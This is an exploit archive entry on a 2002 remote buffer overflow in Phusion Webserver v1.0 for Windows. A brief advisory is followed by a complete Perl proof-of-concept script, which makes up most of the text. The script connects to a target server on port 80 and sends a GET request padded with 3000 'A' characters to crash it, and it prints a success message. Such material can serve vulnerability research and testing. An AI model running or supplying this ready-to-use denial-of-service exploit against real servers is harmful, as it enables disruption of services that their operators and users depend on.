source: http://www.securityfocus.com/bid/4118/info

Phusion Webserver is a commercial HTTP server that runs on Microsoft Windows 9x/NT/2000 operating systems.

It is possible for a remote attacker to deny service to legitimate users of the service by submitting an excessively long web request (approximately 3000+ bytes).

It should be noted that this issue is due to a remotely exploitable buffer overflow condition. 

#!/usr/bin/perl
#
# Simple script to send a long 'A^s' command to the server, 
# resulting in the server crashing.
#
# Phusion Webserver v1.0 proof-of-concept exploit.
# By Alex Hernandez <al3xhernandez@ureach.com> (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti & H.Oliveira.
# 
#
# Usage: perl -x Phusion_DoS.pl -s <server>
#
# Example: 
#
# perl -x Phusion_DoS.pl -s 10.0.0.1
# 
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nPhusion Webserver v1.0 DoS exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&usage;}

($serv,$port,$def,$num,$data,$buf,$in_addr,$paddr,$proto);

$def = "A";
$num = "3000";
$data .= $def x $num;
$serv = $args{s};
$port = 80;
$buf = "GET /cgi-bin/$data /HTTP/1.0\r\n\r\n";


$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";


print("\nCrash was successful !\n\n");

sub usage {die("\n\nUsage: perl -x $0 -s <server>\n\n");}